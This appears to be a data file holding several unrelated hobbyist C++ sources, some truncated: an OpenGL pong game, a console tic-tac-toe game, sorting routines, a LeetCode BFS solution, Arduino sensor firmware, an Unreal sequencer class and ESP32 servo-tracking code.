    "\ufeff\n////////////////////\n//topspeed3x = 10.0;\n//topspeed3y = -10.0;\n////////////////////\n\n\n#include <iostream>\n#include <math.h>\n#include <GL/freeglut.h>\n\n//daire\n#define M_PI 3.1415926\n#define radius 15\n#define value1 160\n\nfloat ballx = 500.0;\nfloat bally = 450.0;\n\nint cx = radius;\nint cy = radius;\n\nfloat ww = 1000.0;\nfloat wh = 900.0;\n\nfloat speed1 = 0.0;\nfloat speed2 = 0.0;\nfloat topspeed3x = 0.0;\nfloat topspeed3y = 0.0;\n\nfloat direction1 = 0.0;\nfloat direction2 = 0.0;\n\n//bir dizi tan\u0131mla ve raketlerin konumuna g\u00f6re top y\u00f6n de\u011fi\u015ftirsin\n\nvoid drawScene(void)\n{\n\tfloat red = 1.0;\n\tfloat green = 1.0;\n\tfloat blue = 0.0;\n    char text[8] = \"DEDELER\";\n\tint counter = 0;\n\n\tglClear(GL_COLOR_BUFFER_BIT);\n\tglColor3f(red, green, blue); \n\tglRasterPos2f(468.5, 450); \n\n\twhile (counter <= 10) \n\t{\n\t\tglutBitmapCharacter(GLUT_BITMAP_HELVETICA_18,text[counter]); \n\t\tcounter++;\n\t}\n\t\n\n\t\n\tglColor3f(red, green, blue);\n\n\tglBegin(GL_TRIANGLE_FAN);\n\n\tglVertex3f(0.8 + direction1,0.0,0.0);// one point \n\tglVertex3f(190.0 + direction1,0.0,0.0);// two point \n\tglVertex3f(190.0 + direction1,20.0,0.0);// there point \n\tglVertex3f(0.8 + direction1,20.0,0.0);// four point \n\n\tglEnd();\n\tglFlush();\n\n    red = 1.0;\n    green = 1.0;\n\tblue = 0.0;\n\n\tglColor3f(red, green, blue);\n\n\tglBegin(GL_TRIANGLE_FAN);\n\n\tglVertex3f(0.8 + direction2, 900, 0.0);// one point \n\tglVertex3f(190.0 + direction2, 900, 0.0);// two point \n\tglVertex3f(190.0 + direction2, 880.0, 0.0);// there point \n\tglVertex3f(0.8 + direction2, 880.0, 0.0);// four point \n\n\tglEnd();\n\tglFlush();\n\n\tred = 1.0;\n\tgreen = 0.0;\n\tblue = 0.0;\n\n\tglColor3f(red, green, blue);\n\n\tglBegin(GL_POLYGON); \n\tfor (int i = 0; i < value1; ++i) \n\t{\n\t\tfloat angle = 2.0f * M_PI * float(i) / float(value1); \n\t\tfloat x = radius * cos(angle); \n\t\tfloat y = radius * sin(angle); \n\t\tglVertex2f((cx + x) + ballx,(cy + y) + bally); \n\t}\n\n\tglEnd();\n\tglFlush();\n\n}\n\nvoid update(int value) \n{\n\tdirection1 += speed1;\n\tdirection2 += speed2;\n\tballx += topspeed3x;\n\tbally += topspeed3y;\n\n\tif (direction1 < 0) direction1 = 0;\n\tif (direction1 + 190 > ww) direction1 = ww - 190;\n\n\tif (direction2 < 0) direction2 = 0;\n\tif (direction2 + 190 > ww) direction2 = ww - 190;\n\n\n\tif ((880.0 >= (bally + radius) && 190.0 + direction2 >= (ballx + radius) && (ballx + radius) >= 0.8 + direction2) && 0 <= (bally + radius) || (20.0 >= (bally + radius) && 190.0 + direction1 >= (ballx + radius) && (ballx + radius) >= 0.8 + direction1) && 0 <= (bally + radius))//3 saat ura\u015ft\u0131m aq\n\t{\n\t\t//engel\n\t\t// X eksenindeki s\u0131n\u0131r kontrol\u00fc\n\t\tif (ballx - radius < -20.0 || ballx + radius > ww -20.0) {\n\t\t\ttopspeed3x = -topspeed3x; // X y\u00f6n\u00fcn\u00fc de\u011fi\u015ftir\n\t\t}\n\t\t                    //alt                         //\u00fcst\n\t\t// Y eksenindeki s\u0131n\u0131r kontrol\u00fc\n\t\tif (bally - radius < 10 || bally + radius > wh - 40) {\n\t\t\ttopspeed3y = -topspeed3y; // Y y\u00f6n\u00fcn\u00fc de\u011fi\u015ftir\n\t\t}\n\t}\n\telse\n\t{\n\t\t//sebest\n\t\t// X eksenindeki s\u0131n\u0131r kontrol\u00fc\n\t\tif (ballx - radius < -20 || ballx + radius > ww - 20) {\n\t\t\ttopspeed3x = -topspeed3x; // X y\u00f6n\u00fcn\u00fc de\u011fi\u015ftir\n\t\t}\n\n\t\t //Y eksenindeki s\u0131n\u0131r kontrol\u00fc\n\t\tif (bally - radius < -20 || bally + radius > wh - 20) {\n\t\t\ttopspeed3y = -topspeed3y; // Y y\u00f6n\u00fcn\u00fc de\u011fi\u015ftir\n\t\t}\n\t}\n\t\n\n\t////raket olunca\n\t//if (!((160.0 + direction2 >= bally && 880.0 >= bally) || (160.0 + direction1 >= bally && 20.0 >= bally)))\n\t//{\n\t//\tif (ballx < 160.0) ballx = 160.0;\n\t//\tif (ballx + radius * 2 > (ww - 160.0)) ballx = (ww - 160.0) - radius * 2;\n\n\t//\tif (bally < 20.0) bally = 20.0;\n\t//\tif (bally + radius * 2 > (wh - 20.0)) bally = (wh - 20.0) - radius * 2;\n\n\t//}\n\t//\n\t//else\n\t//{\n\t//\t//engel olmadan\n\t//\tif (ballx < 0) ballx = 0;\n\t//\tif (ballx + radius * 2 > (ww - 0)) ballx = (ww - 0) - radius * 2;\n\n\t//\tif (bally < 0) bally = 0;\n\t//\tif (bally + radius * 2 > (wh - 0)) bally = (wh - 0) - radius * 2;\n\n\t//}\n\t\n\n\tglutPostRedisplay();\n\tglutTimerFunc(6, update, 0); //165 FPS \n}\nvoid ball_direction() \n{\n\n\t// Ba\u015flang\u0131\u00e7 y\u00f6n\u00fc ve h\u0131z\u0131\n\ttopspeed3x = 5.0; // Sa\u011fdan sola\n\ttopspeed3y = 5.0; // Yukar\u0131dan a\u015fa\u011f\u0131ya\n\n  glutPostRedisplay();\n\n}\n\nvoid keyInput(unsigned char key, int x, int y) \n{\n\tswitch (key) {\n\tcase 27:\n\t\texit(0);\n\tcase 'd'://AYNI AN\n\tcase 'D':\n\t\tspeed1 = 5.0;\n\t\tbreak;\n\tcase 'a'://AYNI AN\n\tcase 'A':\n\t\tspeed1 = -5.0;\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n\n}\n\nvoid keyInput2(int key, int x, int y) \n{\n\tswitch (key) {\n\tcase GLUT_KEY_LEFT:\n\t\tspeed2 = -5.0;\n\t\tbreak;\n\tcase GLUT_KEY_RIGHT:\n\t\tspeed2 = 5.0;\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n}\nvoid setup(void)\n{\n\tglClearColor(0.0, 0.0,0.0, 0.0);\n}\n\nvoid myReshape(GLsizei w, GLsizei h)\n{\n\n\tglMatrixMode(GL_PROJECTION);\n\tglLoadIdentity();\n\tglOrtho(0.0, (GLdouble)w, 0.0, (GLdouble)h, -1.0, 1.0);\n\tglMatrixMode(GL_MODELVIEW);\n\tglLoadIdentity();\n\tglViewport(0, 0, w, h);\n\t//\tglClearColor(0.0, 0.0, 0.0, 1.0);\n\tglClear(GL_COLOR_BUFFER_BIT);\n\tww = w;\n\twh = h;\n}\nvoid resize(int w, int h)\n{\n\tglViewport(0, 0, w, h);\n\tww = w;\n\twh = h;\n\tprintf(\"\\n w=%u - h=%u\", w, h);\n\t\n\tglMatrixMode(GL_PROJECTION);\n\tglLoadIdentity();\n\tglOrtho(0.0, ww, 0.0, wh, -1.0, 1.0);\n\tglMatrixMode(GL_MODELVIEW);\n\tglLoadIdentity();\n\tww = w;\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n\r\nchar board[3][3] = {{'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'}};\r\n// Function to draw the game board\r\nvoid drawBoard(char board[3][3]) \r\n{\r\n\tcout << \"\\n\\n\\t\\t\\t\";\r\n    cout << \"-------------\" << endl;\r\n    for (int i = 0; i < 3; i++)\r\n\t {\r\n\t \tcout << \"\\t\\t\\t\";\r\n\t \tcout << \"|\";\r\n        for (int j = 0; j < 3; j++)\r\n\t\t {\r\n\t\t \t\r\n            cout << \" \" << board[i][j] << \" \";\r\n            if(j<2)\r\n            cout << \"|\";\r\n        }\r\n        \r\n        cout << \"|\";\r\n        cout << endl;\r\n        \r\n        cout << \"\\t\\t\\t\";\r\n        if (i < 2) \r\n\t\t{\r\n            cout << \"|-----------|\" << endl;\r\n        }\r\n    }\r\n    cout << \"-------------\" << endl;\r\n}\r\n\r\n// Function to check for a win\r\nbool checkWin(char board[3][3], char player)\r\n {\r\n    // Check rows and columns\r\n    for (int i = 0; i < 3; i++)\r\n\t {\r\n        if (board[i][0] == player && board[i][1] == player && board[i][2] == player) return true;\r\n        if (board[0][i] == player && board[1][i] == player && board[2][i] == player) return true;\r\n    }\r\n    // Check diagonals\r\n    if (board[0][0] == player && board[1][1] == player && board[2][2] == player) return true;\r\n    if (board[0][2] == player && board[1][1] == player && board[2][0] == player) return true;\r\n    return false;\r\n    \r\n    for (int i = 0; i < 3; i++)\r\n    {\r\n    \tif (!(board[i][0] == player && board[i][1] == player && board[i][2] == player)) \r\n        if (!(board[0][i] == player && board[1][i] == player && board[2][i] == player))\r\n        if (!(board[0][0] == player && board[1][1] == player && board[2][2] == player)) \r\n    if (!(board[0][2] == player && board[1][1] == player && board[2][0] == player))\r\n    cout << \"\\n\\t\\t\\t No Player Win !!\" << endl;\r\n    \r\n\t}\r\n}\r\n\r\nbool checkDraw(){\r\n\tfor(int i=0;i<3;i++)\r\n\t{\r\n\t\tfor(int j=0;j<3;j++)\r\n\t\t{\r\n\t\t\tif(board[i][j]!='X' && board[i][j]!='0')\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn true;\r\n}\r\n\r\nint main() {\r\n\r\n    char player = 'X';\r\n    int move;\r\n    \r\n    while (true) \r\n\t{\r\n        system(\"cls\"); // clear the console\r\n        cout << \"\\t\\t\\t=============\"<< endl;\r\n\t\tcout << \"\\t\\t\\t Tic Tae Toc\" << endl;\r\n\t\tcout << \"\\t\\t\\t=============\"<< endl;\r\n        drawBoard(board);\r\n        cout << \"\\n\\tPlayer \" << player << \":!\\n\\t\\t Enter your move (1-9): \";\r\n        cin >> move;\r\n\r\n        // Validate move\r\n        if (move < 1 || move > 9) \r\n\t\t{\r\n            cout << \"Invalid move, try again.\" << endl;\r\n            cin.ignore();\r\n            cin.get();\r\n            continue;\r\n        }\r\n\r\n        // Convert move to board coordinates\r\n        int row = (move - 1) / 3;\r\n        int col = (move - 1) % 3;\r\n\r\n        // Check if space is already occupied\r\n        if (board[row][col] != 'X' && board[row][col] != 'O') {\r\n            board[row][col] = player;\r\n\r\n            // Check for win\r\n            if (checkWin(board, player)) \r\n\t\t\t{\r\n                system(\"cls\");\r\n\t\t\t\tcout << \"\\t\\t\\t=============\"<< endl;\r\n\t\t\t\tcout << \"\\t\\t\\t Tic Tae Toc\" << endl;\r\n\t\t\t\tcout << \"\\t\\t\\t=============\"<< endl; // clear the console\r\n                drawBoard(board);\r\n                cout << \"\\n\\n\\t\\t ! Player \" << player << \" wins!\" << endl;\r\n                break;\r\n            }\r\n\r\n            // Switch player\r\n            player = (player == 'X') ? 'O' : 'X';\r\n        }\r\n\t\t else \r\n\t\t {\r\n            cout << \"\\n\\n\\t\\tSpace already occupied, try again.\" << endl;\r\n            cin.ignore();\r\n            cin.get();\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <cstring>\n#include <string>\n#include <thread>  // for sleep\n#include <chrono>  // for sleep duration\n\n// Function to print raw binary data of a variable\nvoid print_binary(void* ptr, size_t size) {\n    unsigned char* byte_ptr = (unsigned char*)ptr;\n    for (size_t i = 0; i < size; i++) {\n        for (int j = 7; j >= 0; j--) {\n            std::cout << ((byte_ptr[i] >> j) & 1);\n        }\n        std::cout << \" \";\n    }\n    std::cout << std::endl;\n}\n\nint main() {\n    // Define various variables with different data types\n    int a = 10;\n    float b = 3.14f;\n    double c = 6.28;\n    char d = 'X';\n    std::string e = \"Hello, world!\";\n    bool f = true;\n\n    // Define void pointers pointing to these variables\n    void* ptr_a = &a;\n    void* ptr_b = &b;\n    void* ptr_c = &c;\n    void* ptr_d = &d;\n    void* ptr_e = &e;\n    void* ptr_f = &f;\n\n    // Infinite loop to print values continuously\n    while (true) {\n        // Print raw binary data of each variable using print_binary function\n        // std::cout << \"Binary representation of int a: \";\n        // print_binary(ptr_a, sizeof(int));\n\n        // std::cout << \"Binary representation of float b: \";\n        // print_binary(ptr_b, sizeof(float));\n\n        // std::cout << \"Binary representation of double c: \";\n        // print_binary(ptr_c, sizeof(double));\n\n        // std::cout << \"Binary representation of char d: \";\n        // print_binary(ptr_d, sizeof(char));\n\n        // std::cout << \"Binary representation of string e: \";\n        // print_binary(ptr_e, sizeof(std::string));\n\n        // std::cout << \"Binary representation of bool f: \";\n        // print_binary(ptr_f, sizeof(bool));\n\n        // Print the values as they are for each variable\n        std::cout << \"\\nValues in memory:\" << std::endl;\n        std::cout << \"a (int): \" << *(int*)ptr_a << std::endl;\n        std::cout << \"b (float): \" << *(float*)ptr_b << std::endl;\n        std::cout << \"c (double): \" << *(double*)ptr_c << std::endl;\n        std::cout << \"d (char): \" << *(char*)ptr_d << std::endl;\n        std::cout << \"e (string): \" << *(std::string*)ptr_e << std::endl;\n        std::cout << \"f (bool): \" << *(bool*)ptr_f << std::endl;\n\n        // Pause for a short time to slow down the output\n        std::this_thread::sleep_for(std::chrono::seconds(1));\n\n        // Clear the console screen (optional, for cleaner output)\n        std::cout << \"\\033[2J\\033[H\";  // ANSI escape code to clear screen\n    }\n\n    return 0;\n}\n",
    "class Solution {\npublic:\n\n    bool check(int r, int c, int m, int n)\n    {\n        if(r >= 0 && r < m && c >= 0 && c < n) return true;\n        return false;\n    }\n    vector<vector<int>> highestPeak(vector<vector<int>>& mat) {\n        int m = mat.size();\n        int n = mat[0].size();\n        vector<vector<int>> ans(m,vector<int>(n,-1));\n\n        queue<pair<int,pair<int,int>>> q;\n\n        for(int i=0; i<m; i++)\n        {\n            for(int j=0; j<n; j++)\n            {\n                if(mat[i][j] == 1)\n                {\n                    ans[i][j] = 0;\n                    q.push({0,{i,j}});\n                }\n            }\n        }\n\n        int rd[] = {0,-1,0,1};\n        int cd[] = {1,0,-1,0};\n\n        while(!q.empty())\n        {\n            auto it = q.front();\n            int h = it.first;\n            int r = it.second.first;\n            int c = it.second.second;\n\n            // cout << r << \" \" << c << \" \" << h << endl;\n\n            q.pop();\n            \n            for(int k=0; k<4; k++)\n            {\n                int nr = r + rd[k];\n                int nc = c + cd[k];\n                if(check(nr,nc,m,n) && ans[nr][nc] == -1)\n                {\n                    ans[nr][nc] = h + 1;\n                    q.push({h+1, {nr,nc}});\n                }\n            }\n        }\n        return ans;\n    }\n};",
    "// sortingalgorithms.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <vector>\n#include <iterator>\n\nusing namespace std;\n\n\nvoid bubblesort(vector<float> unsortedvect) {\n\tvector<float>::iterator it = unsortedvect.begin();\n\tfor (int i = 0; i < unsortedvect.size()-1; i++) {\n\t\t\n\t\tfor (int j = 0; j < unsortedvect.size()-i-1;j++ )\n\t\t{\n\t\t\tfloat temp = unsortedvect[j];\n\t\t\tif (unsortedvect[j] > unsortedvect[j + 1]) {\n\t\t\t\tswap(unsortedvect[j], unsortedvect[j + 1]);\n\t\t\t}\n\t\t}\n\t}\n\tfor (int k = 0; k <= unsortedvect.size() - 1; k++)\n\t{\n\t\tcout << *it << \" \";\n\t\tit++;\n\t}\n\t \n}\n\nvoid insertionsort(vector<float> unsorted) {\n\n\tvector<float>::iterator it = unsorted.begin();\n\tfor (int i = 1; i < unsorted.size(); i++) {\n\t\tfloat key = unsorted[i];\n\t\tint k = i - 1;\n\t\t//shifting the sorted part for the key right position \n\t\twhile (k >= 0 && unsorted[k] > key) \n\t\t{\n\t\t\tunsorted[k + 1] = unsorted[k];\n\t\t\tk--;\n\t\t}\n\t\tunsorted[k + 1] = key;\n\t}\n\n\tfor (int k = 0; k <= unsorted.size() - 1; k++)\n\t{\n\t\tcout << *it << \" \";\n\t\tit++;\n\t}\n\t\n}\nvoid selectionsort(vector<float> unsorted) {\n\t\n\tfor (int i = 0; i < unsorted.size() - 1; i++) {\n\t\tint minIndex = i;\n\n\t\tfor (int j = i + 1; j < unsorted.size(); j++) {\n\t\t\tif (unsorted[j] < unsorted[minIndex]) {\n\t\t\t\tminIndex = j;\n\t\t\t}\n\t\t}\n\n\t\tif (minIndex != i) {\n\t\t\tswap(unsorted[i], unsorted[minIndex]);\n\t\t}\n\t}\n\tvector<float>::iterator ss = unsorted.begin();\n\t\tcout << endl;\n\t\tfor (int f = 0; f <= unsorted.size() - 1; f++) {\n\t\t\tcout << *ss << \" \";\n\t\t\tss++;\n\t\t}\n}\nint main()\n{\n\tvector<float> vect = { 55, 24, 33, 44, 55,48,98,12,46,2,487,6,35 };\n\tselectionsort(vect);\n\t/*vector<float>::iterator ss = vect.begin();*/\n\t/*cout << endl;\n\tfor (int f = 0; f <= vect.size() - 1; f++) {\n\t\tcout << *ss << \" \";\n\t\tss++;\n\t}*/\n}\n\n",
    "// #include <PMS.h>\n// #include \"DFRobot_MultiGasSensor.h\"\n// #include \"DHT.h\"\n// #include <SoftwareSerial.h>\n// #include <MQ131.h>\n// #include <WiFiEsp.h>  // Use WiFiEsp for Arduino Mega and ESP8266\n// #include <EEPROM.h>   // Include EEPROM library to store configuration\n\n// // DIP Switch Configuration\n// #define DIP_SWITCH_3_PIN 3\n// #define DIP_SWITCH_4_PIN 4\n// #define DIP_SWITCH_5_PIN 5\n// #define DIP_SWITCH_6_PIN 6\n// #define DIP_SWITCH_7_PIN 7\n\n// // DHT22 configuration\n// #define DHTPIN 7            // DHT22 data pin connected to pin 7\n// #define DHTTYPE DHT22       // DHT22 type\n// DHT dht(DHTPIN, DHTTYPE);\n\n// // I2C addresses for the gas sensors\n// #define SENSOR_1_ADDR 0x74\n// #define SENSOR_2_ADDR 0x75\n// #define SENSOR_3_ADDR 0x76\n\n// // Gas sensor objects\n// DFRobot_GAS_I2C sensor1(&Wire, SENSOR_1_ADDR);\n// DFRobot_GAS_I2C sensor2(&Wire, SENSOR_2_ADDR);\n// DFRobot_GAS_I2C sensor3(&Wire, SENSOR_3_ADDR);\n\n// // MQ-131 Ozone Sensor configuration\n// #define MQ131_PIN A0\n\n// // ZP07-MP503 VOC Sensor configuration\n// #define MP503_PIN A1\n// #define VCC 5.0  // Supply voltage\n// #define RL 20.0  // Load resistance in k\u2126\n// #define R0 1.0   // Sensor resistance in clean air (needs calibration)\n\n// // PMS5003 Particulate Matter Sensor configuration\n// #define PMS_RX_PIN 8\n// #define PMS_TX_PIN 9\n// SoftwareSerial pmsSerial(PMS_RX_PIN, PMS_TX_PIN);\n// PMS pms(pmsSerial);\n// PMS::DATA pmsData;\n\n// // Gravity CO2 Sensor configuration\n// #define CO2_SENSOR_PIN A2\n// #define DC_GAIN 8.5                 // DC gain of amplifier\n// #define READ_SAMPLE_INTERVAL 50     // Time interval between samples in milliseconds\n// #define READ_SAMPLE_TIMES 5         // Number of samples to take\n// #define ZERO_POINT_VOLTAGE 0.220    // Output voltage at 400PPM CO2\n// #define REACTION_VOLTAGE 0.030      // Voltage drop in 1000ppm CO2\n// float CO2Curve[3] = {2.602, ZERO_POINT_VOLTAGE, (REACTION_VOLTAGE / (2.602 - 3))};\n\n// // WiFi configuration\n// #define WIFI_RX 10  // RX for SoftwareSerial to ESP8266\n// #define WIFI_TX 11  // TX for SoftwareSerial to ESP8266\n// SoftwareSerial wifiSerial(WIFI_RX, WIFI_TX);\n// WiFiEspClient client;\n\n// // EEPROM addresses\n// #define DEVICE_ID_ADDR 0\n// #define SSID_ADDR 50\n// #define PASSWORD_ADDR 100\n\n// // Global variables\n// String deviceID;\n// String ssid;\n// String password;\n\n// // Sensor read delay (in milliseconds)\n// #define SENSOR_READ_DELAY 2000\n\n// // Function prototypes\n// void initializeSensor(DFRobot_GAS_I2C &sensor, const char *name);\n// void connectToWiFi();\n// void configureDevice();\n// void loadConfiguration();\n// void saveConfiguration();\n// void displayDHT22Data();\n// void displayMQ131Data();\n// void displayMP503Data();\n// void displayPMS5003Data();\n// void displayCO2Data();\n// void displayGasSensorData(const char *sensorName, DFRobot_GAS_I2C &sensor);\n// bool areSensorsEnabled();\n// bool isWiFiEnabled();\n// String readStringFromEEPROM(int addr);\n// void writeStringToEEPROM(int addr, const String &data);\n\n// void setup() {\n//   Serial.begin(115200);          // Initialize debug Serial\n//   wifiSerial.begin(9600);        // Initialize WiFi ESP8266 Serial\n//   WiFi.init(&wifiSerial);        // Initialize WiFiEsp library\n\n//   if (WiFi.status() == WL_NO_SHIELD) {\n//     Serial.println(\"[WiFiEsp] Cannot initialize ESP module\");\n//     while (true); // Halt execution if the ESP8266 is not detected\n//   }\n\n//   dht.begin();                   // Initialize DHT22 sensor\n//   pmsSerial.begin(115200);       // Initialize PMS5003\n//   Wire.begin();                  // Initialize I2C bus\n\n//   // Initialize gas sensors\n//   initializeSensor(sensor1, \"Sensor 1\");\n//   initializeSensor(sensor2, \"Sensor 2\");\n//   initializeSensor(sensor3, \"Sensor 3\");\n\n//   // Load configuration\n//   loadConfiguration();\n\n//   // Configure device if required\n//   if (deviceID.length() == 0 || ssid.length() == 0 || password.length() == 0) {\n//     configureDevice();\n//   }\n\n//   // Connect to WiFi if enabled\n//   if (isWiFiEnabled()) {\n//     connectToWiFi();\n//   }\n// }\n\n// void loop() {\n//   if (areSensorsEnabled()) {\n//     Serial.println(\"========== All Sensor Data ==========\");\n\n//     // Read and display sensor data\n//     displayDHT22Data();\n//     displayMQ131Data();\n//     displayMP503Data();\n//     displayPMS5003Data();\n//     displayCO2Data();\n//     displayGasSensorData(\"Sensor 1\", sensor1);\n//     displayGasSensorData(\"Sensor 2\", sensor2);\n//     displayGasSensorData(\"Sensor 3\", sensor3);\n\n//     Serial.println(\"=====================================\");\n//   } else {\n//     Serial.println(\"Sensors are not enabled. No data will be printed.\");\n//   }\n\n//   delay(SENSOR_READ_DELAY);\n// }\n\n// void displayDHT22Data() {\n//   float temp = dht.readTemperature();\n//   float humidity = dht.readHumidity();\n\n//   if (isnan(temp) || isnan(humidity)) {\n//     Serial.println(\"DHT22: Failed to read data!\");\n//   } else {\n//     Serial.print(\"DHT22 - Temperature: \");\n//     Serial.print(temp);\n//     Seria",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"SequencerCustomPlugin/MovieScene/Sections/MyMovieSceneEventSection.h\"\n#include \"Channels/MovieSceneChannelEditorData.h\"\n#include \"Channels/MovieSceneChannelProxy.h\"\n\n/*\n*****************************************************************************/\n\nvoid FMyMovieSceneEventData::GetKeys(const TRange<FFrameNumber>& WithinRange, TArray<FFrameNumber>* OutKeyTimes, TArray<FKeyHandle>* OutKeyHandles)\n{\n\tGetData().GetKeys(WithinRange, OutKeyTimes, OutKeyHandles);\n}\n\nvoid FMyMovieSceneEventData::GetKeyTimes(TArrayView<const FKeyHandle> InHandles, TArrayView<FFrameNumber> OutKeyTimes)\n{\n\tGetData().GetKeyTimes(InHandles, OutKeyTimes);\n}\n\nvoid FMyMovieSceneEventData::SetKeyTimes(TArrayView<const FKeyHandle> InHandles, TArrayView<const FFrameNumber> InKeyTimes)\n{\n\tGetData().SetKeyTimes(InHandles, InKeyTimes);\n}\n\nvoid FMyMovieSceneEventData::DuplicateKeys(TArrayView<const FKeyHandle> InHandles, TArrayView<FKeyHandle> OutNewHandles)\n{\n\tGetData().DuplicateKeys(InHandles, OutNewHandles);\n}\n\nvoid FMyMovieSceneEventData::DeleteKeys(TArrayView<const FKeyHandle> InHandles)\n{\n\tGetData().DeleteKeys(InHandles);\n}\n\nvoid FMyMovieSceneEventData::DeleteKeysFrom(FFrameNumber InTime, bool bDeleteKeysBefore)\n{\n\tGetData().DeleteKeysFrom(InTime, bDeleteKeysBefore);\n}\n\nvoid FMyMovieSceneEventData::ChangeFrameResolution(FFrameRate SourceRate, FFrameRate DestinationRate)\n{\n\tGetData().ChangeFrameResolution(SourceRate, DestinationRate);\n}\n\nTRange<FFrameNumber> FMyMovieSceneEventData::ComputeEffectiveRange() const\n{\n\treturn GetData().GetTotalRange();\n}\n\nint32 FMyMovieSceneEventData::GetNumKeys() const\n{\n\treturn Times.Num();\n}\n\nvoid FMyMovieSceneEventData::Reset()\n{\n\tTimes.Reset();\n\tKeyValues.Reset();\n\tKeyHandles.Reset();\n}\n\nvoid FMyMovieSceneEventData::Offset(FFrameNumber DeltaPosition)\n{\n\tGetData().Offset(DeltaPosition);\n}\n\n\nFKeyHandle FMyMovieSceneEventData::GetHandle(int32 Index)\n{\n\treturn GetData().GetHandle(Index);\n}\n\nint32 FMyMovieSceneEventData::GetIndex(FKeyHandle Handle)\n{\n\treturn GetData().GetIndex(Handle);\n}\n\n\n/*\n*****************************************************************************/\nUMyMovieSceneEventSection::UMyMovieSceneEventSection()\n{\n\tbSupportsInfiniteRange = true;\n\tSetRange(TRange<FFrameNumber>::All());\n\n#if WITH_EDITOR\n\n\tChannelProxy = MakeShared<FMovieSceneChannelProxy>(EventData, FMovieSceneChannelMetaData());\n\n#else\n\n\tChannelProxy = MakeShared<FMovieSceneChannelProxy>(EventData);\n\n#endif\n}\n",
    "#include <AsyncWebCam.hpp>\r\n#include <FaceDetect.hpp>\r\n#include <ESP32Servo.h>\r\n\r\nAsyncWebCam asyncwebcam;\r\nFaceDetect facedetect;\r\n\r\nServo servoX, servoY, servoZ;\r\nconst int servoXPin = 1;\r\nconst int servoYPin = 2;\r\nconst int servoZPin = 4;\r\n\r\nconst struct { double min, max, def; } servoLimits[] = {\r\n    {90, 170, 130}, {45, 100, 75}, {70, 170, 140}\r\n};\r\n\r\nServo* servos[] = {&servoX, &servoY, &servoZ};\r\n\r\n\r\n/* \u53c2\u8c03\u7528 */\r\nconst int TOTAL_STEPS = 150;      // \u9ed8\u8ba4\u7684\u6700\u5927\u6b65\u6570\r\nconst int TOTAL_DELAY = 250; // \u9ed8\u8ba4\u603b\u65f6\u95f4\uff08\u6beb\u79d2\uff09\r\n\r\nvolatile float targetAngle[3] = {130, 45, 170};\r\nvolatile float currentAngle[3] = {130, 45, 170};\r\n\r\n/* \u4e09\u4e2a\u8235\u673a\u540c\u65f6\u5e73\u6ed1\u8f6c\u52a8\u51fd\u6570 */\r\nvoid servo_smooth(float x, float y, float z) {\r\n  int steps;\r\n  float delaytime, maxAngleDiff, stepAngles[3], tA[3] = {x, y, z};\r\n\r\n  // \u5224\u65ad\u8f93\u5165\u503c\u662f\u5426\u8d85\u51fa\u8303\u56f4\r\n  if (tA[0] < servoLimits[0].min) tA[0] = servoLimits[0].min;\r\n  if (tA[0] > servoLimits[0].max) tA[0] = servoLimits[0].max;\r\n  if (tA[1] < servoLimits[1].min) tA[1] = servoLimits[1].min;\r\n  if (tA[1] > servoLimits[1].max) tA[1] = servoLimits[1].max;\r\n  if (tA[2] < servoLimits[2].min) tA[2] = servoLimits[2].min;\r\n  if (tA[2] > servoLimits[2].max) tA[2] = servoLimits[2].max;\r\n\r\n  // \u8ba1\u7b97\u6700\u5927\u89d2\u5ea6\u5dee\r\n  for (int i = 0; i < 3; i++) {\r\n    float diff = abs(tA[i] - currentAngle[i]);\r\n    if (diff > maxAngleDiff) maxAngleDiff = diff;\r\n  }\r\n\r\n  // \u8ba1\u7b97\u6b65\u6570\u548c\u6bcf\u6b65\u5ef6\u65f6\r\n  steps = max(1, (int)(maxAngleDiff * TOTAL_STEPS / 180.0)); // \u6b65\u6570\u8ba1\u7b97\r\n  delaytime = TOTAL_DELAY / steps; // \u6bcf\u6b65\u5ef6\u65f6\r\n\r\n  // \u8ba1\u7b97\u6bcf\u6b65\u8f6c\u52a8\u89d2\u5ea6\r\n  for (int i = 0; i < 3; i++) {\r\n    stepAngles[i] = (tA[i] - currentAngle[i]) / steps;\r\n  }\r\n\r\n  // \u5e73\u6ed1\u79fb\u52a8\u5230\u76ee\u6807\u89d2\u5ea6\r\n  for (int step = 0; step < steps; step++) {\r\n    // \u82e5\u6709\u65b0\u6570\u636e\u7acb\u5373\u4e2d\u65ad\u5f53\u524d\u5e73\u6ed1\u8fc7\u7a0b\r\n    if (asyncwebcam.newdata) break;\r\n    \r\n    // \u5426\u5219\u66f4\u65b0currentAngle\u5e76\u5199\u5165\u8235\u673a\r\n    for (int i = 0; i < 3; i++) {\r\n      currentAngle[i] += stepAngles[i];\r\n      servos[i] -> write(currentAngle[i]);\r\n    }\r\n    \r\n    // \u6bcf\u6b65\u7b49\u5f85\u7684\u65f6\u95f4\r\n    delay(delaytime);\r\n  }\r\n}\r\n\r\nvoid servo_smooth(float x, float y) {\r\n  int steps;\r\n  float z = y+65;\r\n  float delaytime, maxAngleDiff, stepAngles[3], tA[3] = {x, y, z};\r\n\r\n  // \u5224\u65ad\u8f93\u5165\u503c\u662f\u5426\u8d85\u51fa\u8303\u56f4\r\n  if (tA[0] < servoLimits[0].min) tA[0] = servoLimits[0].min;\r\n  if (tA[0] > servoLimits[0].max) tA[0] = servoLimits[0].max;\r\n  if (tA[1] < servoLimits[1].min) tA[1] = servoLimits[1].min;\r\n  if (tA[1] > servoLimits[1].max) tA[1] = servoLimits[1].max;\r\n  if (tA[2] < servoLimits[2].min) tA[2] = servoLimits[2].min;\r\n  if (tA[2] > servoLimits[2].max) tA[2] = servoLimits[2].max;\r\n\r\n  // \u8ba1\u7b97\u6700\u5927\u89d2\u5ea6\u5dee\r\n  for (int i = 0; i < 3; i++) {\r\n    float diff = abs(tA[i] - currentAngle[i]);\r\n    if (diff > maxAngleDiff) maxAngleDiff = diff;\r\n  }\r\n\r\n  // \u8ba1\u7b97\u6b65\u6570\u548c\u6bcf\u6b65\u5ef6\u65f6\r\n  steps = max(1, (int)(maxAngleDiff * TOTAL_STEPS / 180.0)); // 